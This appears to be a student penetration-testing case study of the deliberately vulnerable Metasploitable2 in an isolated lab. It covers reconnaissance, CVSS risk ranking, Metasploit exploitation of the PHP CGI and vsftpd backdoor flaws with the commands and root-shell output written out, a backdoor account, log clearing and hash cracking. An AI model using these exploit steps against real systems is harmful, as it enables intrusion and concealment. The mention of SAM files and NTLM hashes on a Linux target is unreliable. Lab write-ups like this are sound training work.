Penetration Testing Case Study

Metasploitable2: Vulnerability Assessment & Exploitation

A full offensive security lifecycle against an intentionally vulnerable Linux target — reconnaissance, CVSS-based risk prioritisation, multi-vector exploitation, persistence, and password cracking, run entirely in an isolated virtual lab.

TargetMetasploitable2 (10.0.2.3)
Attacker MachineKali Linux
EnvironmentIsolated virtual lab
CourseBachelor of Cybersecurity, La Trobe University
8+ Critical/High CVEs Identified
2 Independent Root-Level Exploit Paths
10.0 Highest CVSS Score (VSFTPD & Samba)
6 Phases: Recon → Credential Recovery
01
Reconnaissance

Service Enumeration with Nmap

A full Nmap port scan mapped the target's complete attack surface before any exploitation was attempted. The scan revealed an unusually large attack surface for a single host — legacy, end-of-life services with well-documented public exploits, several of which required no authentication at all.

  • Open ports: FTP (21), SSH (22), Telnet (23), SMTP (25), DNS (53), HTTP/Apache 2.2.8 (80)
  • Additional ports: Samba (139/445), bindshell (1524), MySQL (3306), distccd (3632), VNC (5900), UnrealIRCd (6667), Apache Tomcat (8180)
  • OS fingerprint confirmed: Linux 2.6.9–2.6.33, Samba 3.0.20-Debian
02
Web App Scanning

Nikto Against DVWA

Nikto was used to assess the web services on port 80 and enumerate the DVWA (Damn Vulnerable Web Application) instance hosted on the target. Scanning uncovered layered misconfigurations on top of the already vulnerable network services.

  • Security misconfiguration: HTTP TRACE enabled, phpinfo.php exposed
  • Broken access control: directory indexing on /dvwa/config/
  • Cryptographic failures: SSLv2 enabled, cookies missing the HttpOnly flag
  • Confirmed CVE-2012-1823 (PHP RCE) and CVE-2014-3704 (SQL injection)
03
Risk Prioritisation

CVSS Scoring & Risk Register

Every service identified during recon was cross-referenced against known CVEs and scored by CVSS severity and public exploit availability to decide which vulnerabilities to pursue first.

Overall risk posture: very poor — the environment runs multiple end-of-life services with public exploits, default credentials, and no meaningful access controls.

The vsftpd 2.3.4 backdoor and the Samba 3.0.20 vulnerability both allow unauthenticated remote code execution via a single Metasploit module. These flaws chain into a full compromise path:

  1. Gain initial access via the vsftpd 2.3.4 backdoor on port 21
  2. Enumerate the system to identify further services
  3. Access phpMyAdmin using default credentials to extract database contents
  4. Escalate to root using the distccd vulnerability
  5. Establish persistence via the root bindshell already listening on port 1524

Notably, port 1524 has a root shell listening by default — full compromise is achievable simply by connecting to it, without exploiting a single CVE.

04
Exploitation

Two Independent Root-Level Exploit Paths

Method 1 — PHP CGI Argument Injection: the php_cgi_arg_injection exploit was used to gain a Meterpreter session on the target.

use exploit/multi/http/php_cgi_arg_injection set RHOSTS 10.0.2.3 run [*] Meterpreter session 1 opened (10.0.2.15:4444 -> 10.0.2.3:55144)

Method 2 — VSFTPD 2.3.4 Backdoor: exploited independently to obtain root, confirming the finding wasn't a fluke of one code path.

use exploit/unix/ftp/vsftpd_234_backdoor set RHOSTS 10.0.2.3 run whoami root id uid=0(root) gid=0(root)
05
Persistence

Backdoor Account & Log Evidence Clearing

With root access confirmed, a backdoor account was created and log evidence was cleared to demonstrate a full post-exploitation persistence workflow — then verified independently with a live SSH login from the Kali attack machine.

06
Credential Recovery

Password Cracking with Ophcrack & CrackStation

SAM file hashes recovered from the target were loaded into Ophcrack and cross-checked against CrackStation to recover plaintext credentials — demonstrating the final link in the attacker lifecycle: turning recovered hashes into usable, reusable passwords.

Key Findings

8+ Vulnerabilities

Identified across network and web services, all with public exploits available.

Two Root Paths

Root-level compromise achieved through two independent exploitation paths (PHP CGI injection and vsftpd backdoor).

Verified Persistence

Persistent access established via a backdoor user account and confirmed with a live SSH login.

Credentials Recovered

Both recovered NTLM password hashes cracked using Ophcrack and CrackStation.
